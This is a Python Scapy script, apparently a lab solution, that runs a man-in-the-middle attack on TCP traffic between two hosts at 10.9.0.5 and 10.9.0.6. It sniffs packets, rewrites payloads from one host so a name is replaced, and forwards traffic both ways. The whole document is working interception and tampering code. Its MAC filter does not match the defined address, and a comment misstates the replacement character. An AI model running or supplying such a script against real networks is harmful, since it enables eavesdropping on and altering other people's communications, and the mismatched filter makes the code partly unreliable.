#!/usr/bin/env python3

from scapy.all import *

# Set up the necessary IP and MAC addresses for packet sniffing and spoofing
MY_SECRET_NAME = "Nigel"
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

# Define the function to spoof the packets
def packet_spoofing(pkt):
    # Check if the source and destination IP addresses match those we are targeting
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the original packet
        new_pkt = IP(bytes(pkt[IP]))
        # Remove the checksums and payload from the new packet
        del(new_pkt.chksum)
        del(new_pkt[TCP].payload)
        del(new_pkt[TCP].chksum)

        # If the packet has a payload, modify it
        if pkt[TCP].payload:
            # Decode the payload and replace the secret name with X's
            data = pkt[TCP].payload.load
            data = data.decode()
            print("Original text: "+data)
            new_data = data.replace(MY_SECRET_NAME, 'A' * len(MY_SECRET_NAME))
            print("Modified text: "+new_data)
            # Send the modified packet
            send(new_pkt/new_data, verbose=False)
        else:
            # If the packet doesn't have a payload, just send the modified packet
            send(new_pkt, verbose=False)

    # Check if the source and destination IP addresses match those we are targeting (in reverse order)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create a new packet based on the original packet
        new_pkt = IP(bytes(pkt[IP]))
        # Remove the checksums from the new packet
        del(new_pkt.chksum)
        del(new_pkt[TCP].chksum)
        # Send the modified packet
        send(new_pkt, verbose=False)

# Set up the filter to capture the necessary packets for spoofing
my_filter = 'tcp and (ether src 02:04:0a:09:00:05 or ether src 02:42:0a:09:00:06)'
# Start sniffing packets and calling the packet_spoofing function on each one
sniffed_packet = sniff(iface='eth0', filter=my_filter, prn=packet_spoofing)
